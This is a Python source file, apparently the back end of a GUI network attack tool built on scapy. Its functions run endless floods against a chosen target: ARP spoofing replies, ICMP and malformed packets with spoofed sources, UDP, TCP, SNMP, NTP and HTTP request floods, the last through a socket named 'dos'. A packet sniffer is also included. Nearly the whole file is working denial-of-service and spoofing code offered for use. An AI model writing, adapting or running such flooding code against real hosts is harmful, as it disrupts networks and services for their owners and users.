from matplotlib.pyplot import get
from scapy.all import *
import random
import string  
import secrets 
import re
import socket

def test():
    return "hello"

def is_fqdn(host):
    try:
        host = host.replace("https://", "").replace("http://", "").replace("www.", "")
        socket.gethostbyname(host)
    except socket.gaierror:
        return False
    return True

def fqdn_to_ip(fqdn):
    fqdn = fqdn.replace("https://", "").replace("http://", "").replace("www.", "")
    return socket.gethostbyname(fqdn)
   
def portValid(port):
    if port.isdigit() and (1 <= int(port) <= 65535):
        return True
    return False
       
def IPvalid(ip):
    regex = "^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$"
    if(re.search(regex, ip)):
        return True
    return False
  
def Beginable(self):
    if self.checkbox_arp.get() == 1 :
        return True    
    if self.icmp_check.get() == "2" :
        return True
    if self.icmp_check.get() == "3" :
        return True     
    if self.checkbox_udp.get() == 1 :
        return True    
    if self.checkbox_tcp.get() == 1 :
        return True   
    if self.CheckNTP.get() == 1 :
        return True    
    if self.CheckSNMP.get() == 1 :
        return True   
    if self.CheckHTTP.get() == 1 :
        return True
    if self.CheckHTTP_2.get() == 1 :
        return True       
    return False
    
def randData():
    output = ''.join(secrets.choice(string.ascii_letters + string.digits + string.punctuation) for x in range(random.randint(10, 50)))
    return str(output)

def generate_url_path():
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, 5))
    return data

def get_mac(ip):
    """
    Returns MAC address of any device connected to the network
    If ip is down, returns None instead
    """
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src

def arp(target_ip,host_ip):
    #target_mac = get_mac(target_ip)
    send(ARP(pdst=target_ip, hwdst='ff:ff:ff:ff:ff:ff', psrc=host_ip, op='is-at'), verbose=0,loop=1)

def icmp(target):
    send(IP(dst=target)/ICMP(),loop=1)

def malform_icmp(target):
  while True:
    if random.randint(1, 8)>=5:
        send(IP(dst=target, ihl=2, version=3)/ICMP()) 
    else: 
        ARP_Packet = ARP()
        ARP_Packet.sport = RandShort()
        ARP_Packet.dport = RandShort(),
        ARP_Packet.flags = "S"
        ARP_Packet.seq = RandShort()
        ARP_Packet.window = RandShort()
        send(IP(dst=target,src=RandShort())/ARP_Packet)

def udp(target,targetPort,data):
    send(IP(dst=target)/UDP(dport=targetPort,sport=RandShort())/data,loop=1)

def tcp(ip,port,flag,data):
    send(IP(dst=ip)/TCP(dport=port,flags=flag,
          seq=RandShort(),ack=RandShort(),sport=RandShort())/data ,loop=1)
        
def snmp(target):
    
    targetPort = 161
    send(IP(dst=target)/UDP(dport=targetPort,sport=RandShort())/SNMP(version=3, community="private", 
            PDU=SNMPget(varbindlist= [SNMPvarbind(oid="1.2.3",value="test")])),loop=1)
   
def ntp(target):
    targetPort = 123
    if random.randint(1, 8)>=5:
        send(IP(dst=target)/UDP(dport=targetPort,sport=RandShort())/("\x1b\x00\x00\x00"+"\x00"*11*4),loop=1)
    else:
        send(IP(dst=target)/UDP(dport=targetPort,sport=RandShort())/NTP(),loop=1)    

def http(ip,port,type):
    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
    dos.connect((ip, port)) 
    url_path = generate_url_path()
    method=""
    if type==1: 
        method="GET"
    else:
        method="POST"
    while True:
        byt = (f"{method} /{url_path} HTTP/1.1\nHost: {ip}\n\n").encode()
        dos.send(byt)
    
def capture(ip):
    condition="host "+ip
    sniff(filter=condition, iface="Wi-Fi", prn=lambda x: x.summary())

class thread_with_trace(threading.Thread):
    def __init__(self, *args, **keywords):
        threading.Thread.__init__(self, *args, **keywords)
        self.killed = False 
    def start(self):
        self.__run_backup = self.run
        self.run = self.__run     
        threading.Thread.start(self)
    def __run(self):
        sys.settrace(self.globaltrace)
        self.__run_backup()
        self.run = self.__run_backup
    def globaltrace(self, frame, event, arg):
        if event == 'call':
            return self.localtrace
        else:
            return None
    def localtrace(self, frame, event, arg):
        if self.killed:
            if event == 'line':
                raise SystemExit()
        return self.localtrace
    def kill(self):
        self.killed = True        